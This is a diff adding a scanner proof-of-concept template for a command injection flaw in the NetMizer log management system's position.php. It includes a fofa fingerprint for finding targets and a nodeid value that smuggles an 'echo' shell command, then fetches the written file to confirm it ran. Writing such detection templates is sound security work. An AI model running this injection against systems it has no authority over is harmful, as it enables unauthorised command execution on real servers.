@@ -1,0 +1,19 @@
+id: poc-yaml-netmizer-log-management-system-position-rce
+info:
+  name: NetMizer 日志管理系统 position命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: NetMizer 日志管理系统
+  fofa: title="NetMizer 日志管理系统"
+variables:
+  t1: random_int(100,1000)
+requests:
+- method: GET
+  path: /data/search/position.php?action=file&nodeid=|echo%20"vulnerability">test{{.t1}}.txt
+  expression: "status_code == 200 && \ncontains(find_json(body,\"success\"), \"success\"\
+    ) &&\ncontains(find_json(body,\"total\"), \"0\") \n"
+- method: GET
+  path: /data/search/test{{.t1}}.txt
+  expression: "status_code == 200 && \ntrim(body) == \"vulnerability\"\n"
+transport: http
